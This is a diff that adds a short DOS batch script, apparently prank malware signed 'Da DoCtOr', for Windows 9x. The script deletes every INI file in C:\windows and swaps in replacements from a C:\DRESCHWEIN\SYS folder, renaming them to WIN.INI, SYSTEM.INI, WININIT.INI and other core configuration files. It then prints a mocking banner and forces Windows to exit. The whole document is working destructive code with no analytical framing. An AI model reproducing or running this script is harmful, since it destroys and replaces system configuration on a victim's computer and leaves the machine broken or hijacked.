@@ -1,0 +1,23 @@
+@ECHO OFF
+CD..
+C:\
+CD windows
+DEL *.INI
+COPy C:\DRESCHWEIN\SYS\*.INI
+REN NIW.INI WIN.INI
+REN TININIW.INI WININIT.INi
+REN METSYS.INI SYSTEM.INI
+REN SOI.INI IOS.INI
+REN GERNACS.INI SCANREG.INI
+@ECHO OFF
+ECHO.
+ECHO.
+ECHO.
+ECHO.
+ECHO Dreschwein fickin dos
+ECHO              ^By^
+ECHO              ^Da^
+ECHO             ^DoCtOr^
+ECHO          Bless you child!
+c:\windows\rundll.exe user.exe,exitwindows
+PAUSE
